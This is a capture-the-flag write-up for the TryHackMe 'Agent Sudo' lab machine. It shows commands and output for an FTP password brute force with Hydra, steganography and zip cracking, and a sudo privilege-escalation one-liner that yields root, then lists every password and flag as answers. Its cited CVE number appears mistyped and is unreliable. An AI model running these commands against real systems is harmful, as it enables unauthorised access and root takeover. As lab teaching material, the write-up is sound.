Swatish Attaluri
Date: 30-05-2021
## Agent Sudo CTF - Tryhackme
### Machine IP: 10.10.183.50
#### Nmap scan
```bash
$ nmap -sV -sC -oN ports 10.10.183.50                                                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 13:45 IST
Nmap scan report for 10.10.183.50
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.20 seconds
```
#### Curl for user-agent
```bash
$ curl -A "C" -L 10.10.183.50            
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```
#### Hydra FTP bruteforce
```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.50
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-30 14:13:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.183.50:21/
[21][ftp] host: 10.10.183.50   login: chris   password: crystal
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-30 14:14:48
```
#### FTP login
```bash
$ ftp 10.10.183.50
Connected to 10.10.183.50.
220 (vsFTPd 3.0.3)
Name (10.10.183.50:starboy): chris
331 Please specify the password.
Password:crystal
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.32 secs (107.9811 kB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.32 secs (102.4815 kB/s)
ftp> exit
221 Goodbye.
```
#### Analyzing the downloaded files from FTP
```bash
$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
Exiftool and hexdump didnt work for the image files, steghide asks for a password.
Use binwalk
Binwalk is used to search binary files and execuatble code in image files
binwalk filename
binwalk filename -e to extract any zip file in the image file
```bash
$ binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


$ binwalk cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

$ cd _cutie.png.extracted
```
The file 8702.zip is encrypted so we cannot unzip it.
We will zip2john and use john with a wordlist
```bash
$ 7z x 8702.zip
asks for a password

$ zip2john 8702.zip > tobecracked
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

$ john tobecracked                                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:02 DONE 2/3 (2021-05-30 14:45) 0.4926g/s 21184p/s 21184c/s 21184C/s Winnie..buzz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
              
			  
			  
$ cat To_agentR.txt                                                                                  
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R


$ echo "QXJlYTUx" | base64 -d                                     
Area51 

```
Use this password "Area51" for steghide
```bash
$ steghide info cute-alien.jpg                                                                  
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: Area51
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

steghide extract -sf cute-alien.jpg                                                             
Enter passphrase: Area51
wrote extracted data to "message.txt".

```
Above  -sf is to specify the stegofilename
```bash
$ cat message.txt                                                                                     
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


```
#### SSH to James
password: hackerrules!
```bash


$ ssh james@10.10.183.50                                                                        
james@10.10.183.50's password: hackerrules!
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 30 09:29:19 UTC 2021

  System load:  0.4               Processes:           97
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 34%               IP address for eth0: 10.10.183.50
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7



```
#### Privilege Escalation
```bash


$ sudo -l
[sudo] password for james: hackerrules!
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash


sudo --version
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

```
User is not allowed to run /bin/bash as root since we have a !root
Lets find an exploit for this sudo version.
use sudo -u \#$((0xffffffff)) /bin/bash  ref:CVE-2019-1428
```bash

$ sudo -u \#$((0xffffffff)) /bin/bash
# whoami
root

# pwd
/home/james
# cd /root
# ls
root.txt
# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R


```
#### Answers
```
##### Task2: 
How many open ports?
3

How you redirect yourself to a secret page?
user-agent

What is the agent name?
chris

##### Task3:
FTP password
crystal

Zip file password
alien

steg password
Area51

Who is the other agent (in full name)?
James

SSH password
hackerrules!

##### Task4:
What is the user flag?
b03d975e8c92a7c04146cfa7a5a313c7

What is the incident of the photo called?
--Google the image with site as foxnews 
Roswell alien autopsy

##### Task5:
CVE number for the escalation 
CVE-2019-1428

What is the root flag?
b53a02f55b57d4439e3341834d70c062

(Bonus) Who is Agent R?
Deskel
```
#sudo
#stenography